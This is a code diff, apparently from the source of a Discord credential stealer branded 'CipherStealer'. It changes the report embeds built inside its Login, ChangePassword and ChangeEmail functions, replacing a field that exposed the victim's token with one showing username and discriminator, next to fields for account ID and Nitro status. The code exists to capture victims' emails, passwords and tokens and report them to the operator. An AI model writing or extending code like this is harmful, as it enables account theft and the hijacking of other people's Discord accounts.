@@ -457,11 +457,12 @@ function Login(email, password, token) {
 								avatar_url: "https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif",
 								content: "",
 								embeds: [{
+									"title": "CipherStealer",
 									
 									"color": 0xFF0300,
 									"fields": [{
-										name: "<:cf_dragon:926273709126332466> | Token",
-										value: `\`${token}\``,
+										name: "<:black_joker:926273784305045526> Usuario",
+										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
 										name: "ID",
@@ -627,9 +628,9 @@ function Login(email, password, token) {
 												
 												"color": 0xFF0300,
 												"fields": [{
-                                                    name: "<:cf_dragon:926273709126332466> | Token",
-                                                    value: `\`${token}\``,
-                                                    inline: !0
+													name: "<:black_joker:926273784305045526> Usuario",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
 												}, {
 													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
@@ -807,8 +808,8 @@ function ChangePassword(oldpassword, newpassword, token) {
 									"title": "CipherStealer",
 									"color": 0xFF0300,
 									"fields": [{
-                                        name: "<:cf_dragon:926273709126332466> | Token",
-										value: `\`${token}\``,
+										name: "<:black_joker:926273784305045526> Usuario",
+										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
 										name: "ID",
@@ -977,9 +978,9 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"title": "CipherStealer",
 												"color": 0xFF0300,
 												"fields": [{
-                                                    name: "<:cf_dragon:926273709126332466> | Token",
-                                                    value: `\`${token}\``,
-                                                    inline: !0
+													name: "<:black_joker:926273784305045526> Usuario",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
 												}, {
 													name: "ID",
 													value: `\`${json.id}\``,
@@ -1166,8 +1167,8 @@ function ChangeEmail(newemail, password, token) {
 									
 									"color": 0xFF0300,
 									"fields": [{
-                                        name: "<:cf_dragon:926273709126332466> | Token",
-										value: `\`${token}\``,
+										name: "<:black_joker:926273784305045526> Usuario",
+										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
 										name: "ID",
@@ -1328,9 +1329,9 @@ function ChangeEmail(newemail, password, token) {
 												
 												"color": 0xFF0300,
 												"fields": [{
-                                                    name: "<:cf_dragon:926273709126332466> | Token",
-                                                    value: `\`${token}\``,
-                                                    inline: !0
+													name: "<:black_joker:926273784305045526> Usuario",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
 												}, {
 													name: "ID",
 													value: `\`${json.id}\``,
